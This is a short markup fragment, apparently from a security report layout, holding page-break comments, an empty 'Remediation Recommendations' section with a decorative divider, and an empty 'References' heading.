</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

